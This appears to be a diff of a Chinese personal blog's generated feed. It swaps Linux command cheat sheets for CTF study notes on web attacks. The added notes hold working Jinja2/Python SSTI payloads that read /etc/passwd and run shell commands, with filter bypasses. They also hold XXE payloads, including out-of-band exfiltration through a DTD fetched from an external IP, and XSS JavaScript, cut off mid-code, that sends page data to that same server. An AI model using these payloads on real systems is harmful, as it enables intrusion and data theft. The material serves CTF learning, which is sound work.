-<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
-</tr>
-<tr>
-<td><code>cp a.txt /tmp/</code></td>
-<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
-</tr>
-<tr>
-<td><code>cp -r dir1 dir2</code></td>
-<td>递归复制目录（必须加 <code>-r</code> 选项）</td>
-</tr>
-<tr>
-<td><code>cp -f a b</code></td>
-<td>强制覆盖目标文件，无论目标文件是否存在</td>
-</tr>
-<tr>
-<td><code>cp -u a b</code></td>
-<td>仅当源文件比目标文件更新时才复制（常用于备份）</td>
-</tr>
-<tr>
-<td><code>cp -i a b</code></td>
-<td>在覆盖目标文件前提示用户确认</td>
-</tr>
-<tr>
-<td><code>cp -v a b</code></td>
-<td>显示详细的复制过程，列出正在复制的文件</td>
-</tr>
-<tr>
-<td><code>cp -a dir1 dir2</code></td>
-<td>复制目录及其内容，保持文件的原始属性（包括符号链接）</td>
-</tr>
-<tr>
-<td><code>cp -l a b</code></td>
-<td>创建目标文件的硬链接，而非复制</td>
-</tr>
-</tbody></table>
-<h3 id="3-删除文件操作"><a href="#3-删除文件操作" class="headerlink" title="3.删除文件操作"></a>3.删除文件操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">| 命令          | 作用                   |</span><br><span class="line">| ------------- | ---------------------- |</span><br><span class="line">| `rm file`     | 删除单个文件           |</span><br><span class="line">| `rm -f file`  | 强制删除，不提示       |</span><br><span class="line">| `rm -r dir`   | 删除目录（递归）       |</span><br><span class="line">| `rm -rf dir`  | 强制删除整个目录       |</span><br><span class="line">| `unlink file` | 删除单文件的轻量命令   |</span><br><span class="line">| `find + rm`   | 删除匹配规则的批量文件 |</span><br><span class="line"></span><br><span class="line">### 4.使用代理</span><br><span class="line"></span><br><span class="line">``` php </span><br><span class="line">./clash -f ./config.yaml                           --直接运行</span><br><span class="line">nohup ./clash -f ./config.yaml &gt; clash.log 2&gt;&amp;1 &amp;       --以后台的方式运行</span><br></pre></td></tr></table></figure>
 
-<h4 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试 HTTP 代理端口：</span><br><span class="line">            curl -x http:<span class="comment">//127.0.0.1:7890 https://ipinfo.io</span></span><br><span class="line">测试 SOCKS5 端口：</span><br><span class="line">               curl --socks5 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7891</span> https:<span class="comment">//ipinfo.io</span></span><br><span class="line">proxychains curl https:<span class="comment">//ipinfo.io</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="5-xargs传递输出"><a href="#5-xargs传递输出" class="headerlink" title="5.xargs传递输出:"></a>5.xargs传递输出:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">它读取标准输入（stdin）的一行一行内容，然后把它“拼接”到后面的命令后面。</span><br><span class="line">xargs cat =cat 文件1 文件2 文件3 ...</span><br></pre></td></tr></table></figure>
+<h3 id="1-Python-2-7"><a href="#1-Python-2-7" class="headerlink" title="1. Python 2.7"></a>1. Python 2.7</h3><h4 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
 
-<h3 id="6-cat函数类似的-—linxu函数"><a href="#6-cat函数类似的-—linxu函数" class="headerlink" title="6.cat函数类似的 —linxu函数"></a>6.cat函数类似的 —linxu函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 </span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">paste: 每一行是两个文件对应行用TAB拼接起来。</span><br><span class="line">rev: 每一行的字符顺序被颠倒输出了。</span><br><span class="line">strings:  -- 会从二进制文件（如可执行文件、.so 文件、图片等）中找出 可打印字符序列（可读文本）。</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
 
-<h3 id="7-创建一个文件"><a href="#7-创建一个文件" class="headerlink" title="7.创建一个文件:"></a>7.创建一个文件:</h3><table>
-<thead>
-<tr>
-<th>命令示例</th>
-<th>作用</th>
-<th>特点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>touch file.txt</code></td>
-<td>创建空文件</td>
-<td>文件已存在时更新时间戳</td>
-</tr>
-<tr>
-<td><code>echo &quot;hello&quot; &gt; file.txt</code></td>
-<td>创建并写入内容</td>
-<td>会覆盖已有文件内容</td>
-</tr>
-<tr>
-<td><code>cat &gt; file.txt</code> （输入内容后按 <code>Ctrl+D</code>）</td>
-<td>手动输入内容创建文件</td>
-<td>适合一次性写多行</td>
-</tr>
-<tr>
-<td><code>printf &quot;flag&#123;123&#125;\n&quot; &gt; flag.txt</code></td>
-<td>创建并写入格式化内容</td>
-<td>可用于生成 CTF flag 等结构化内容</td>
-</tr>
-<tr>
-<td><code>&gt; empty.txt</code></td>
-<td>创建空文件</td>
-<td>文件已存在则清空内容</td>
-</tr>
-<tr>
-<td><code>dd if=/dev/zero of=bigfile.bin bs=1M count=10</code></td>
-<td>创建指定大小文件</td>
-<td>常用于测试、磁盘填充</td>
-</tr>
-<tr>
-<td><code>vi file.php</code> <code>nano file.txt</code></td>
-<td>打开编辑器创建</td>
-<td>写完保存即可生成文件</td>
-</tr>
-</tbody></table>
-<h3 id="8-查看进程"><a href="#8-查看进程" class="headerlink" title="8.查看进程;"></a>8.查看进程;</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>ps aux</code></td>
-<td>显示所有用户的所有进程</td>
-<td>&#96;ps aux</td>
-</tr>
-<tr>
-<td><code>top</code> &#x2F; <code>htop</code></td>
-<td>实时显示进程动态信息</td>
-<td><code>top</code>（<code>htop</code>更美观）</td>
-</tr>
-<tr>
-<td><code>pidof &lt;name&gt;</code></td>
-<td>查找某个程序的 PID</td>
-<td><code>pidof clash</code></td>
-</tr>
-<tr>
-<td><code>pgrep &lt;pattern&gt;</code></td>
-<td>进程名匹配并返回 PID</td>
-<td><code>pgrep -fl clash</code></td>
-</tr>
-<tr>
-<td><code>lsof -p &lt;pid&gt;</code></td>
-<td>查看某进程打开的文件</td>
-<td><code>lsof -p 1234</code></td>
-</tr>
-<tr>
-<td><code>netstat -tunlp</code></td>
-<td>查看进程监听端口</td>
-<td>&#96;netstat -tunlp</td>
-</tr>
-<tr>
-<td><code>ss -tulnp</code></td>
-<td>更快的 <code>netstat</code> 替代</td>
-<td>&#96;ss -tulnp</td>
-</tr>
-<tr>
-<td><code>strace -p &lt;pid&gt;</code></td>
-<td>跟踪某进程系统调用</td>
-<td><code>strace -p 1234</code></td>
-</tr>
-</tbody></table>
-<h3 id="9-查看端口"><a href="#9-查看端口" class="headerlink" title="9.查看端口:"></a>9.查看端口:</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>netstat -tunlp</code></td>
-<td>查看所有监听端口 + 对应进程</td>
-<td>&#96;netstat -tunlp</td>
-</tr>
-<tr>
-<td><code>ss -tulnp</code></td>
-<td>更快的 <code>netstat</code> 替代</td>
-<td>&#96;ss -tulnp</td>
-</tr>
-<tr>
-<td><code>lsof -i:&lt;端口&gt;</code></td>
-<td>查看端口对应的进程</td>
-<td><code>lsof -i:7890</code></td>
-</tr>
-<tr>
-<td><code>fuser &lt;端口&gt;/tcp</code></td>
-<td>快速查看哪个PID占用了端口</td>
-<td><code>fuser 8080/tcp</code></td>
-</tr>
-<tr>
-<td><code>cat /proc/net/tcp</code></td>
-<td>直接读取系统 TCP 表</td>
-<td>可写脚本查所有端口状态</td>
-</tr>
-<tr>
-<td><code>nmap 127.0.0.1 -p-</code></td>
-<td>扫描本地开放端口</td>
-<td>本地横向扫描、提权辅助</td>
-</tr>
-</tbody></table>
-<h4 id="1-参数相关"><a href="#1-参数相关" class="headerlink" title="1.参数相关:"></a>1.参数相关:</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-t</code></td>
-<td>TCP</td>
-<td>仅显示 TCP 连接</td>
-</tr>
-<tr>
-<td><code>-u</code></td>
-<td>UDP</td>
-<td>仅显示 UDP 连接</td>
-</tr>
-<tr>
-<td><code>-l</code></td>
-<td>Listen</td>
-<td>仅显示监听状态（如服务器在等待连接）</td>
-</tr>
-<tr>
-<td><code>-n</code></td>
-<td>Numeric</td>
-<td>不解析域名&#x2F;服务名，显示原始IP和端口号（加速、绕过DNS）</td>
-</tr>
-<tr>
-<td><code>-p</code></td>
-<td>Process</td>
-<td>显示哪个进程（PID&#x2F;程序名）占用此连接，需要 <code>root</code> 权限</td>
-</tr>
-</tbody></table>
-<h3 id="10-把帮助信息设置为中文"><a href="#10-把帮助信息设置为中文" class="headerlink" title="10.把帮助信息设置为中文:"></a>10.把帮助信息设置为中文:</h3><h4 id="1-下载汉化包"><a href="#1-下载汉化包" class="headerlink" title="1.下载汉化包;"></a>1.下载汉化包;</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install language-pack-zh-hans</span><br></pre></td></tr></table></figure>
+<h4 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到 file 类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p>之后可以这样访问中文:    LANG&#x3D;zh_CN.UTF-8 netstat –help</p>
-<h4 id="2-将LANG-zh-CN-UTF-8设置别名"><a href="#2-将LANG-zh-CN-UTF-8设置别名" class="headerlink" title="2.将LANG&#x3D;zh_CN.UTF-8设置别名;"></a>2.将LANG&#x3D;zh_CN.UTF-8设置别名;</h4><h5 id="1-临时设置别名"><a href="#1-临时设置别名" class="headerlink" title="1.临时设置别名;"></a>1.临时设置别名;</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">临时生效（当前终端有效）</span><br><span class="line">          alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
 
-<h5 id="2-永久生效（自动加载）"><a href="#2-永久生效（自动加载）" class="headerlink" title="2.永久生效（自动加载）"></a>2.永久生效（自动加载）</h5><p>编辑你的 shell 配置文件：</p>
+<h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：通过 func_globals.linecache.os 执行系统命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法2：通过 __builtins__ 中的 eval 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法3：属性式调用 eval</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法4：调用 __import__ 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法5：索引方式调用 __import__</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-Python-3-7"><a href="#2-Python-3-7" class="headerlink" title="2. Python 3.7"></a>2. Python 3.7</h3><h4 id="1-获取基类-1"><a href="#1-获取基类-1" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="2-文件操作-1"><a href="#2-文件操作-1" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再调用 open 读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="3-命令执行-1"><a href="#3-命令执行-1" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再用 eval 调用 os.popen 执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 也可尝试 popen 直接调用（仅当 popen 未被删减）</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#无下划线版</span><br><span class="line">&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-各种过滤"><a href="#3-各种过滤" class="headerlink" title="3.各种过滤:"></a>3.各种过滤:</h3><h4 id="1-绕过过滤"><a href="#1-绕过过滤" class="headerlink" title="1.绕过过滤:"></a>1.<code>&#123;%%&#125;</code>绕过过滤<code>&#123;&#123;&#125;&#125;</code>:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试&#123;%%&#125;，想回显内容在外面加个print就行</span><br><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-getitem-绕过-过滤："><a href="#2-getitem-绕过-过滤：" class="headerlink" title="2.getitem()绕过[]过滤："></a>2.getitem()绕过[]过滤：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</span><br><span class="line">原本是[117]，中括号被ban就用</span><br><span class="line">__getitem__(117)代替[117]</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-request方法绕过引号："><a href="#3-request方法绕过引号：" class="headerlink" title="3.request方法绕过引号："></a>3.request方法绕过引号：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。</span><br><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2025/06/02/ctfshow/xxe/</url>
+    <content><![CDATA[<h1 id="xxe的原理"><a href="#xxe的原理" class="headerlink" title="xxe的原理:"></a>xxe的原理:</h1><p>可以通过构造恶意 XML 数据，引入外部实体来实现：</p>
 <ul>
-<li>如果你用的是 bash：</li>
+<li>读取本地敏感文件（如 <code>/etc/passwd</code>）</li>
+<li>进行内网 SSRF</li>
+<li>拒绝服务（Billion Laughs）</li>
+<li>执行系统命令（少见，取决于 parser）</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure>
+<h2 id="1-xxe的前提"><a href="#1-xxe的前提" class="headerlink" title="1.xxe的前提:"></a>1.xxe的前提:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --允许加载外部实体（XXE的前提）</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>如果你用的是 zsh：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>添加这一行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>保存后让它立即生效：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">source ~/.bashrc   # 或 ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<h3 id="11-ls命令"><a href="#11-ls命令" class="headerlink" title="11.ls命令"></a>11.ls命令</h3><table>
+<h2 id="2-常见的攻击方式"><a href="#2-常见的攻击方式" class="headerlink" title="2.常见的攻击方式:"></a>2.常见的攻击方式:</h2><table>
 <thead>
 <tr>
-<th>参数</th>
-<th>含义说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-l</code></td>
-<td>以长格式列出文件详细信息（权限、用户、大小、修改时间等）</td>
-</tr>
-<tr>
-<td><code>-a</code></td>
-<td>显示所有文件，包括以 <code>.</code> 开头的隐藏文件</td>
-</tr>
-<tr>
-<td><code>-h</code></td>
-<td>与 <code>-l</code> 配合使用，显示人类可读的文件大小（如 1K，234M）</td>
-</tr>
-<tr>
-<td><code>-S</code></td>
-<td>按文件大小排序，默认是从大到小</td>
-</tr>
-<tr>
-<td><code>-r</code></td>
-<td>反向排序（与 <code>-t</code>、<code>-S</code> 等配合使用时效果明显）</td>
-</tr>
-<tr>
-<td><code>-t</code></td>
-<td>按时间排序，最近修改的文件排在前面</td>
-</tr>
-<tr>
-<td><code>-R</code></td>
-<td>递归列出子目录内容</td>
-</tr>
-<tr>
-<td><code>-d</code></td>
-<td>如果后面跟的是目录，只显示目录本身而不是其内容</td>
-</tr>
-<tr>
-<td><code>-F</code></td>
-<td>在文件名后附上符号（如 <code>/</code> 表示目录，<code>*</code> 表示可执行）</td>
-</tr>
-<tr>
-<td><code>-i</code></td>
-<td>显示文件的 inode 编号</td>
-</tr>
-<tr>
-<td><code>-n</code></td>
-<td>类似 <code>-l</code>，但显示 UID 和 GID 而非用户名和组名</td>
-</tr>
-<tr>
-<td><code>--color=auto</code></td>
-<td>给文件名上色（目录蓝色、可执行绿色等），通常默认启用</td>
-</tr>
-<tr>
-<td><code>--time=ctime</code></td>
-<td>使用变更时间（ctime）排序，而不是默认的修改时间（mtime）</td>
-</tr>
-<tr>
-<td><code>-1</code></td>
-<td>每个文件单独一行显示（默认多个列显示时使用）</td>
-</tr>
-</tbody></table>
-<h4 id="ls常用组合"><a href="#ls常用组合" class="headerlink" title="ls常用组合"></a>ls常用组合</h4><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>用法说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>ls -alh</code></td>
-<td>列出所有文件 + 详细信息 + 可读大小</td>
-</tr>
-<tr>
-<td><code>ls -lhS</code></td>
-<td>按大小排序显示文件</td>
-</tr>
-<tr>
-<td><code>ls -lt</code></td>
-<td>按修改时间排序</td>
-</tr>
-<tr>
-<td><code>ls -ltr</code></td>
-<td>按时间升序排列（旧文件在前）</td>
-</tr>
-<tr>
-<td><code>ls -R</code></td>
-<td>查看当前目录及所有子目录内容</td>
-</tr>
-</tbody></table>
-<h3 id="12-head命令"><a href="#12-head命令" class="headerlink" title="12.head命令:"></a>12.head命令:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的前几行。</span><br><span class="line">head [选项] [文件名]</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
+<th>类型</th>
+<th>描述</th>
 <th>示例</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>-n N</code></td>
-<td>显示前 N 行（默认是 10 行）</td>
-<td><code>head -n 5 file.txt</code></td>
+<td>📁 本地文件读取</td>
+<td>读取敏感文件</td>
+<td><code>file:///etc/passwd</code></td>
 </tr>
 <tr>
-<td><code>-c N</code></td>
-<td>显示前 N 个字节</td>
-<td><code>head -c 20 file.txt</code></td>
+<td>🌐 SSRF</td>
+<td>访问内网资源</td>
+<td><code>http://127.0.0.1/admin</code></td>
+</tr>
+<tr>
+<td>💣 DoS</td>
+<td>百万笑攻击导致内存爆炸</td>
+<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>📤 外带</td>
+<td>将数据发送到外部服务器</td>
+<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
+</tr>
+<tr>
+<td>😈 Blind-XXE</td>
+<td>没有直接输出，通过回显外带</td>
+<td>配合 <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
 </tr>
 </tbody></table>
-<h4 id="14-tail-命令"><a href="#14-tail-命令" class="headerlink" title="14.tail 命令:"></a>14.tail 命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的最后几行。</span><br><span class="line">tail [选项] [文件名]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><h2 id="1-直接"><a href="#1-直接" class="headerlink" title="1.直接:"></a>1.直接:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-n N</code></td>
-<td>显示最后 N 行（默认 10 行）</td>
-<td><code>tail -n 5 error.log</code></td>
-</tr>
-<tr>
-<td><code>-c N</code></td>
-<td>显示最后 N 个字节</td>
-<td><code>tail -c 100 file.txt</code></td>
-</tr>
-<tr>
-<td><code>-f</code></td>
-<td>实时输出追加的内容（日志监控）</td>
-<td><code>tail -f /var/log/syslog</code></td>
-</tr>
-<tr>
-<td><code>+N</code></td>
-<td>从第 N 行开始显示（常用于搭配 <code>tail -n +2</code>）</td>
-<td><code>tail -n +2 file.txt</code></td>
-</tr>
-</tbody></table>
-<h2 id="13-创建一个新用户，并设置密码与权限"><a href="#13-创建一个新用户，并设置密码与权限" class="headerlink" title="13.创建一个新用户，并设置密码与权限"></a>13.创建一个新用户，并设置密码与权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建新用户</span><br><span class="line">        sudo adduser 用户名</span><br><span class="line">设置用户密码（如果没设置成功或要修改）</span><br><span class="line">         sudo passwd 用户名</span><br><span class="line">赋予权限（加入特定组）       </span><br></pre></td></tr></table></figure>
+<h2 id="2-数据外带"><a href="#2-数据外带" class="headerlink" title="2.数据外带:"></a>2.数据外带:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<table>
+<h2 id="3-一些绕过"><a href="#3-一些绕过" class="headerlink" title="3.一些绕过"></a>3.一些绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss</title>
+    <url>/2025/06/02/ctfshow/xss/</url>
+    <content><![CDATA[<h1 id="常见过滤"><a href="#常见过滤" class="headerlink" title="常见过滤:"></a>常见过滤:</h1><h2 id="如果使用了http-only"><a href="#如果使用了http-only" class="headerlink" title="如果使用了http-only:"></a>如果使用了http-only:</h2><h3 id="1-GET请求外带"><a href="#1-GET请求外带" class="headerlink" title="1.GET请求外带:"></a>1.GET请求外带:</h3><p>GET外带：</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;接口&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST外带:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// 发送到攻击者服务器</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title 